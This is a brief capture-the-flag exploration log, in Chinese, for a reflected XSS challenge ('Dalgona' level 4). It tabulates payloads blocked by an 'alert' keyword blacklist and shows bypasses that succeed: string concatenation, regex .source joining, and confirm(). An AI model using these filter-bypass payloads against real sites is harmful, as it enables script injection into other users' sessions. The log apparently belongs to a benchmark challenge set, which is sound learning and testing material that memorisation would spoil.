# xben-074-24 · 探索记录

对应题解：[`xben-074-24.md`](./xben-074-24.md)

## 目标与起点

Dalgona 第 4 关，`/page?name=`，反射在 input 之后的文本节点。

## 第一阶段：常见标签全被拦

| payload | 结果 |
| --- | --- |
| `<svg onload=alert("XSS")>` | `Sorry you can't use: 'alert'` |
| `<img src=x onerror=alert("XSS")>` | 同上 |
| `<input autofocus onfocus=alert("XSS")>` | 同上 |

## 第二阶段：拆关键字

| payload | 结果 |
| --- | --- |
| `<svg onload=top['ale'+'rt']('XSS')>` | **flag** |
| `<svg onload=top[/ale/.source+/rt/.source]('XSS')>` | **flag** |
| `<svg onload=confirm('XSS')>` | **flag** |

## 这次真正的收获

黑名单只拦字面量 `alert`；拼接或换函数都能过。失败文案是直接的线索。
